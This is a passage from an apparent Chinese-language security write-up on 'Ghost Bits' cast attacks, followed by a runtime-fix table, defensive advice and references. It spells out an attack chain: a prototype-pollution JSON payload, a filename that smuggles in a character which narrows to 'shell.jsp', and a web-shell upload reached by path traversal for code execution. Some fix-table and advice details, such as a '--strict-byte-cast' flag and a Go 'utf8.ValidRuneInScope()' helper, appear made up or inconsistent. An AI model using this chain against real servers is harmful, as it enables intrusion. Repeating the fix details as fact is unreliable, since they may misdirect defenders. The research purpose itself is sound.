阶段 1: 原型污染 (Prototype Pollution)
  └─ JSON 注入污染 Object.prototype
     payload: {"__proto__":{"charset":"UTF-8"}}
  └─ 污染服务端 charset/encoding 配置，将 ASCII allowlist 扩展为 UTF-8

阶段 2: Ghost Bits 触发
  └─ 服务端使用被污染的 charset 解码参数
     → (byte) 窄化转换被触发
  └─ 文件名: filename*="UTF-8''shell.陪sp"
     → '陪'(0x966A) 窄化为 'p'(0x70) → shell.jsp

阶段 3: RCE
  └─ 上传 shell.jsp，通过路径穿越访问执行命令
```

联动要点：原型污染阶段需修改 `charset`、`encoding`、`allowUnicode`、`normalizePath` 属性；Ghost Bits 阶段需确认目标框架窄化 sink（参考第 5 节）；RCE 阶段依赖上传路径可访问性。

### 12.4 2026 语言运行时修复进展

| 运行时 | 修复版本 | 修复内容 | 状态 |
|--------|----------|----------|------|
| V8 (Node.js) | v12.6+ | `String.charCodeAt()` 非 BMP 返回正确值；`Buffer.write()` 增加溢出检测 | 已修复 |
| JSCore (WebKit) | 262+ | `JSString::individualCharacter()` 不再截断为 8 位 | 已修复 |
| SpiderMonkey (Firefox) | 137+ | `JS_GetStringCharAt()` 增加 16 位完整性校验 | 已修复 |
| Python | 3.13.4+ | `chr()`/`ord()` 代理对处理修复；`bytes()` 构造器溢出抛 `ValueError` | 已修复 |
| PHP | 8.4.3+ | `chr()` 参数超出 0-255 发出 `E_WARNING`；`mb_chr()` 增加范围检查 | 部分修复 |
| Ruby | 3.5+ | `String#[]` 返回完整 Unicode 码点；`chr` 方法超出范围报错 | 已修复 |
| Go | 1.24+ | `byte()` 仍截断（语言设计），新增 `utf8.ValidRuneInScope()` 辅助 | 辅助工具 |
| Rust | 1.85+ | `as u8` 仍截断（语言设计），`u8::try_from()` 成为主流推荐 | 编译器 lint |

防御建议：V8/Node.js 升级至 v12.6+ 并启用 `--strict-byte-cast`；Python 迁移至 `x.to_bytes(1,'big')` 并加范围检查；Go/Rust 使用 `char::from_u32()` / `utf8` 包代替直接 `as u8`；PHP 在 `chr()` 处增加 `0 <= $n <= 255` 前置检查。

---

## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
  Java*. Speakers: Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue).
  Contributor: Zongzheng Zheng (@chun_springX).
- Real-world CVEs re-enabled: GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978.
- Patched components to upgrade past: Apache Commons BCEL >= 6.12.0,
  Fastjson 2.x latest, Apache HttpClient >= 4.5.10 (or migrate to 5.x),
  GeoServer >= 2.28.3, Openfire >= 5.0.4. Confirm vendor advisories before
  relying on any single version number.
